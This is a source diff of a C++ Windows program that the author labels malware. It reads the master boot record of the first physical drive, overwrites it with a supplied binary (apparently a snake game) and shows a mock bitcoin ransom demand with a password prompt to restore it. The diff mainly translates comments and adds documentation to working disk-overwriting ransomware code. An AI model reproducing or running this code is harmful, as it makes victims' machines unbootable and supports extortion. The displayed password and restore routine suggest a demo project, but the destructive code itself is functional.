@@ -2,15 +2,25 @@
 #include <conio.h>
 #include <stdio.h>
 #define BLOCK_SIZE 512
+/**
+    Malware program that overwrites the MBR.
+    Overwriting the MBR will make the host machine unable to boot the OS.
+
+    @author: Florea Vlad
+
+*/
 
 
-/**Functie folosita pentru a citii un sector de pe disk
-    Param: _dsk - Disk-ul de pe care citim
-            _buff -Bufferul in care citim
-            _nsect - sectorul pe care il citim, fiecare sector are 512 bytes.
+
+
+/**ReadSect - We use this function to read a sector from the disk
+    Param: _dsk - The disk we read from, usually, physicalDrive0
+            _buff - Store Buffer- has to be allocated
+            _nsect - Sector Number - each sector has 512 bytes. MBR is number 0 
 */
 short ReadSect (const char *_dsk,char *&_buff,unsigned int _nsect){
   DWORD dwRead;   
+  //Trying to get a handle on the disk
   HANDLE hDisk=CreateFile(_dsk,GENERIC_READ,FILE_SHARE_VALID_FLAGS,0,OPEN_EXISTING,0,0);
   if(hDisk==INVALID_HANDLE_VALUE) 
     {  
@@ -18,15 +28,18 @@ short ReadSect (const char *_dsk,char *&_buff,unsigned int _nsect){
        printf("Couldn't Coppy MBR\n");
        return 1;
     }
-  SetFilePointer(hDisk,_nsect*512,0,FILE_BEGIN); 
 
+    //Read the n-th sector
+  SetFilePointer(hDisk,_nsect*512,0,FILE_BEGIN); 
   ReadFile(hDisk,_buff,512,&dwRead,0); 
   CloseHandle(hDisk);
   return 0;
 }
 
 
-//Functie folosita pentru a citii MBR-ul de pe disk.
+/**ReadMBR()
+    We use this function to read and store the machines MBR.
+*/
 char* readMBR(){
     char *dsk="\\\\.\\PhysicalDrive0";
     //Sector 0 = first 512 bytes = MBR
@@ -38,24 +51,30 @@ char* readMBR(){
     return buff;
 }
 
-//Functie folosita pentru a suprascrie MBR-ul
-//Arg: pathToBin - calea catre binarul ce va fi scris peste mbr.
+/** overWriteMBR() 
+    We use this function to overwrite the MBR.
+    We need administrator privileges.
+    @args: pathToBin - the path to the binary that contains the new MBR. 
+
+*/
 void overWriteMBR(char* pathToBin){
     DWORD dw;
-
-    //Orice device de stocare poate fi bootabil, PhysicalDrive0 reprezinta HardDisk-ul (In cazul in care este unul singur)
-    //Putem inlocui cu litera unui dispozitiv de memorie(stick USB) \\.\I:
+    //Any storing device can be bootable, we can also overwrite the MBR of a USB-stick.
+    //Get a handle on the SSD/HDD, asuming there's only one/ the first one is bootable.
     HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive != INVALID_HANDLE_VALUE){
-        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0); //Deschide fisierul binar
+        //Get a handle on the binary file
+        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0); 
         if (binary != INVALID_HANDLE_VALUE){
-            DWORD size = GetFileSize(binary, 0); // Afla dimensiunea fisierului BINAR 
+            //Get the size of the bin file. SHOULD BE LOWER THAN 510!
+            DWORD size = GetFileSize(binary, 0);
             if (size > 0){
                 byte *mbr = new byte[size]; 
-                if (ReadFile(binary, mbr, size, &dw, 0)){ //Citeste continutul binar-ului si stocheaza in bufer-ul mbr
+                if (ReadFile(binary, mbr, BLOCK_SIZE, &dw, 0)){ 
                     printf("Binary file successfuly read!\n");
+                    //OverWrite The MBR
                     if (WriteFile(drive, mbr, size, &dw, 0)){
-                        printf("First sector overritten successfuly!\n"); //Suprascrie MBR-ul
+                        printf("First sector overritten successfuly!\n");
                     }
                     else
                         printf("Fatal error! Can't override 1st sector!\n");
@@ -74,9 +93,13 @@ void overWriteMBR(char* pathToBin){
     else
         printf("Administrator privileges required!\n");
     CloseHandle(drive);
-    _getch();
-
 }
+/**
+    RestoreMbr()
+    We use this function to restore back the MBR.
+    @args: localMBR - Original MBR.
+
+*/
 
 void restoreMBR(char* localMBR){
 
@@ -84,11 +107,11 @@ void restoreMBR(char* localMBR){
     HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive != INVALID_HANDLE_VALUE){
         byte *mbr = new byte[BLOCK_SIZE]; 
-            //Copiaza continutul mbr-ului vechi in buffer
+            //Coppy the content of the original MBR in the mbr buffer. byte  = unsigned char.
             memcpy(mbr,localMBR,BLOCK_SIZE);
-            //Suprascrie MBR-ul
+            //Overwriting the MBR
             if (WriteFile(drive, mbr, size, &dw, 0)){
-                printf("First sector restored successfuly!\n"); //Suprascrie MBR-ul
+                printf("First sector restored successfuly!\n"); 
             }
             else
                 printf("Fatal error! Can't override 1st sector!\n");
@@ -99,13 +122,23 @@ void restoreMBR(char* localMBR){
     CloseHandle(drive);
 }
 
-}
-
+/**
+    Main method
+    Saves the actual MBR.
+    Overwrites the MBR.
+    Awaits for user input.
+    optional: Restore the MBR
+    exit.
+*/
 int main(){
-    //Salvam MBR-ul 
+    
+    //Read The mbr
     char* localMBR = readMBR();
+    
+    //Overwrite the mbr
     overWriteMBR("data.bin");
-    printf("Your MBR has been overwritten\n");
+
+    printf("Your MBR has been overwritten with a snake game\n");
     printf("Pay 10000000 $$ in bitcoin to MasterHacker200 in order to get your MBR back\n");
     printf("After your payment you will receive a password\n");
     printf("Closing this program will cause you to lose all your files!");
@@ -114,15 +147,19 @@ int main(){
     int count = 3;
     while(count != 0){
         printf("You have %d attempts left\n",count);
-        printf("Enter pass number: \n");
+        printf("Enter pass number (Correct Password is 500): \n");
         scanf("%d",&input);
         if(input == pass){
             printf("Well done....trying to restore your MBR! fingers crossed\n");
+            //Restore the MBR
             restoreMBR(localMBR);
+            _getch();
             return 0;
         }
         count--;
     }
-    printf(" :( - Bye\n");
+    printf(" :( Enjoy playing snake :(\n");
+     _getch();
+
  return 0;   
 }
